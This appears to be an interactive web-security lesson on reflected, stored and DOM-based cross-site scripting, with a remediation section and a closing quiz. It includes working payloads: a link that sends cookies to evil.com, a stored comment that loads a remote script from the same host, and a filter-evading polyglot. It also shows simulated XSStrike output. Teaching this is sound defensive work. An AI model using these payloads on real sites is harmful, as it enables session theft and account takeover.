
# Cross-Site Scripting (XSS): Reflected vs Stored

## Executing Code in the Victim's Browser
Cross-Site Scripting (XSS) allows an attacker to inject malicious JavaScript into web pages viewed by other users.
-   **Impact:** Stealing Session Cookies (Account Takeover), Phishing, Keylogging, or redirecting users to malware.
-   **Mechanism:** The browser trusts the script because it thinks it came from the website.

## 1. Reflected XSS (Client-Side)
The malicious script comes from the current HTTP request. It requires a victim to click a malicious link.

<Mermaid chart={`
sequenceDiagram
    participant Attacker
    participant Victim
    participant Server
    
    Attacker->>Victim: Sends Phishing Link (target.com/search?q=<script>...)
    Victim->>Server: Clicks Link (GET /search?q=<script>...)
    Server->>Victim: Returns Page with Script embedded
    note right of Victim: Browser executes script
    Victim->>Attacker: Sends Cookie (Session ID)
`} />

**Example Payload:**
`http://target.com/search?q=<script>fetch('http://evil.com/'+document.cookie)</script>`

## 2. Stored XSS (Persistent)
The malicious script is stored in the database (e.g., in a Comment, Forum Post, or Bio).
-   **Impact:** Much higher. Everyone who views the page gets attacked automatically. No specific link needed.

**Scenario:** You post a comment on a blog:
`Great post! <script src="http://evil.com/hook.js"></script>`

Now, every admin who moderates comments sends you their session cookie.

## 3. DOM-Based XSS
The vulnerability is in the client-side code, not the server.
<CodeBlock language="javascript" showLineNumbers code={`// Vulnerable Code
var search = new URLSearchParams(window.location.search);
var term = search.get("q");
document.getElementById("results").innerHTML = "You searched for: " + term; 
// ^ .innerHTML executes <img src=x onerror=alert(1)>
`} />

## 4. XSS Polyglots
Security filters often block `<script>`. We use "Polyglots" ensuring execution in multiple contexts.

<CodeBlock language="text" showLineNumbers code={`jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`} />

## automated Testing with XSStrike
<TerminalSimulator 
    cmd="xsstrike -u 'http://target.com/search?q=test'" 
    output={`[~] Checking for DOM vulnerabilities...
[!] DOM XSS Found!
    Source: window.location.search
    Sink:   document.write

[~] Fuzzing parameter 'q'
[!] Reflected XSS Found!
    Payload: <svg/onload=confirm()>
    Confidence: 9/10
`} 
/>

## Remediation
1.  **Context-Aware Output Encoding:** Convert `<` to `&lt;` and `>` to `&gt;`.
2.  **Content Security Policy (CSP):** A browser header that says "Only load scripts from self".
    `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;`
3.  **Modern Frameworks:** React/Vue/Angular escape content by default (unless you use `dangerouslySetInnerHTML` or `v-html`).

---

<Quiz 
    question="You suspect Stored XSS in a 'User Bio' field. You input `<script>alert(1)</script>` and save. When you reload the profile, nothing happens, but you see the text `<script>alert(1)</script>` on the screen. Viewing the source shows: `&lt;script&gt;alert(1)&lt;/script&gt;`. Is it vulnerable?" 
    options={[
        "Yes, the script is there",
        "No, the application properly HTML-encoded the input",
        "Yes, but you need a different browser",
        "Yes, use a different payload"
    ]} 
    answer="No, the application properly HTML-encoded the input" 
/>
